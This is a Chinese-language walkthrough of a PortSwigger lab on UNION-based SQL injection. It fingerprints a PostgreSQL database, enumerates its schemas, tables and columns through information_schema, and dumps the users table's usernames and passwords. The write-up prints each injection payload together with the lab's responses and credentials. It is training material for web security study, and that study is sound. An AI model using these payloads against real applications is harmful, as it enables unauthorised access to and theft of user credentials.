# 实验：SQL 注入攻击，在非 Oracle 数据库上列出数据库内容

本实验在产品类别过滤器中包含一个 SQL 注入漏洞。查询结果会返回在应用程序的响应中，因此你可以使用 UNION 攻击从其他表中检索数据。

该应用程序具有登录功能，且数据库包含一个存储用户名和密码的表。你需要确定该表的名称及其包含的列，然后检索表的内容以获取所有用户的用户名和密码。

为了解决本实验，请以 `administrator` 用户身份登录。

> **提示**
> 你可以在我们的 [SQL 注入速查表](https://portswigger.net/web-security/sql-injection/cheat-sheet) 中找到一些有用的 Payload。

## 步骤

探测
- 使用过滤功能
    ```http
    GET /filter?category=Pets HTTP/2
    ```

- 使用经典的1/2个单引号查看字符串型 SQLi
    - 存在典型行为

- 注释符推断并非 MySQL 数据库

- `OEDER BY` 推断列数2

- `UNION SELECT`
    - 无表，推断并非 Oracle 数据库
    - 第一列为字符串型

- 提交版本字符串载荷
    ```sql
    $input='Pets' AND 1=0 UNION SELECT version(),NULL --
    ```
    - 服务器响应为 PostgreSQL 数据库

- 读取数据库
    ```sql
    $input = 'Pets' AND 1=0 UNION SELECT schema_name,NULL FROM information_schema.schemata --
    ```

    - 服务器响应
        ```log
        public
        information_schema
        pg_catalog
        ```

- 读取表

    ```sql
    $input = 'Pets' AND 1=0 UNION SELECT table_name,NULL FROM information_schema.tables WHERE table_schema='public'-- 
    ```

    - 服务器响应
        ```log
        users_fsqcwa
        products
        ```

- 读取列

    ```sql
    $input = 'Pets' AND 1=0 UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users_fsqcwa'-- 
    ```
    - 服务器响应

        ```log
        email
        password_njgxvv
        username_jfgfqe
        ```


- 从列中提取数据

    ```sql
    $input = 'Pets' AND 1=0 UNION SELECT STRING_AGG(username_jfgfqe || ':' || password_njgxvv, ' , '),NULL FROM users_fsqcwa-- 
    ```

    - 服务器响应
        ```log
        administrator:vvrny6cwako6mikac213 , wiener:aoedvdvt6l93hhfy77oe , carlos:1v5zfja022d4ogavlzhe
        ```
